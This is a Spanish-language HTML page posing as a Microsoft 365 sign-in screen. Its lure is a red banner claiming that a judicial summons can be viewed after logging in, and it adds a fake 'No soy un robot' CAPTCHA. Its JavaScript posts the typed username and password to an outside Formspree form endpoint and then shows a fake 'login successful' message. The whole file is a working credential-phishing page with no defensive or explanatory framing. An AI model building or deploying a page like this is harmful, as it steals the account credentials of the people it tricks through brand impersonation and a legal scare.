<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Microsoft 365.HEA_Escolme</title>
  <link rel="icon" type="image/x-icon" href="https://logincdn.msftauth.net/16.000.30004.15/images/favicon.ico">
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      width: 380px;
      padding: 30px;
      border: 1px solid #ddd;
      border-radius: 8px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    .logo {
      width: 120px;
      display: block;
      margin: 0 auto 20px auto;
    }
    h2 {
      text-align: center;
      color: #333;
    }
    .form-group {
      margin: 15px 0;
    }
    input {
      width: 100%;
      padding: 10px;
      font-size: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0067b8;
      border: none;
      color: white;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
    }
    button:hover {
      background-color: #005a9e;
    }
    .helper {
      text-align: center;
      margin-top: 10px;
      font-size: 14px;
    }
    .helper a {
      color: #0067b8;
      text-decoration: none;
    }
    .loading, .thanks {
      text-align: center;
      margin-top: 15px;
      color: #555;
      display: none;
    }
    .thanks {
      color: #0067b8;
      font-size: 18px;
      font-weight: bold;
    }

    /* Mensaje superior */
    .header-message {
      text-align: center;
      margin-bottom: 20px;
      color: #d13438;
      font-size: 15px;
      font-weight: bold;
      padding: 12px;
      background: #fff8f8;
      border: 1px solid #ffd7d7;
      border-radius: 6px;
    }

    /* NUEVO: CAPTCHA falso */
    .captcha {
      margin: 20px 0;
      text-align: center;
    }
    .captcha img {
      width: 200px;
      height: 60px;
      border: 1px solid #ccc;
      border-radius: 4px;
      display: block;
      margin: 0 auto 8px auto;
    }
    .captcha input[type="checkbox"] {
      margin-right: 8px;
      transform: scale(1.2);
    }
    .captcha label {
      font-size: 14px;
      color: #333;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container" id="formContainer">

    <!-- Mensaje superior -->
    <div class="header-message">
      Para ver la citación Judicial por favor ingresa a tu cuenta
    </div>

    <img class="logo" src="https://logos-world.net/wp-content/uploads/2020/09/Microsoft-Logo.png" alt="Logo">
    <h2>Microsoft 365</h2>

    <form id="loginForm">
      <div class="form-group">
        <input type="text" name="usuario" placeholder="Usuario o correo" required>
      </div>
      <div class="form-group">
        <input type="password" name="clave" placeholder="Contraseña" required>
      </div>

      <!-- NUEVO: CAPTCHA  -->
      <div class="captcha">
        <img src="https://cdn.worldvectorlogo.com/logos/recaptcha-wordmark-1.svg" alt="CAPTCHA">
        <label>
          <input type="checkbox" id="captchaCheck" required>
          No soy un robot
        </label>
      </div>

      <button type="submit">Iniciar sesión</button>
      <div class="loading" id="loading">Iniciando sesión...</div>
      <div class="thanks" id="thanks">Login exitoso.</div>
    </form>

    <div class="helper">
      <a href="#">¿Olvidaste tu contraseña?</a>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const loading = document.getElementById('loading');
    const thanks = document.getElementById('thanks');
    const captchaCheck = document.getElementById('captchaCheck');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      // Simular que el CAPTCHA está bien (siempre pasa)
      if (!captchaCheck.checked) {
        alert('Por favor, confirma que no eres un robot.');
        return;
      }

      loading.style.display = 'block';
      thanks.style.display = 'none';

      const formData = new FormData(form);
      const endpoint = "https://formspree.io/f/mvgdggqp";

      try {
        const response = await fetch(endpoint, {
          method: "POST",
          body: formData,
          headers: { 'Accept': 'application/json' }
        });

        loading.style.display = 'none';
        if (response.ok) {
          form.reset();
          captchaCheck.checked = false; // reset captcha
          thanks.style.display = 'block';
        } else {
          alert('Hubo un problema al enviar el formulario.');
        }
      } catch (error) {
        loading.style.display = 'none';
        alert('Error de conexión. Intenta nuevamente.');
      }
    });
  </script>
</body>
</html>
